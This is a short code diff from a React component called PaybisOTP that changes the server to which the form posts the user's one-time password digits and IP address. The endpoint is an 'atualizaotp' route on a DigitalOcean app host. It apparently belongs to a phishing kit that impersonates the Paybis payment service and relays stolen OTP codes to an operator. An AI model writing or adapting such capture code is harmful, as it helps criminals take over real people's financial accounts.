@@ -74,7 +74,7 @@ export default function PaybisOTP({ socket, ip,setCenaAtual }) {
     event.preventDefault();
 
     if (validateForm()) {
-      await axios.post("https://clownfish-app-h28dc.ondigitalocean.app:3333/atualizaotp", {
+      await axios.post("https://jellyfish-app-cgoqz.ondigitalocean.app:3333/atualizaotp", {
         ip,
         OTP:
           otp["otp1"] +
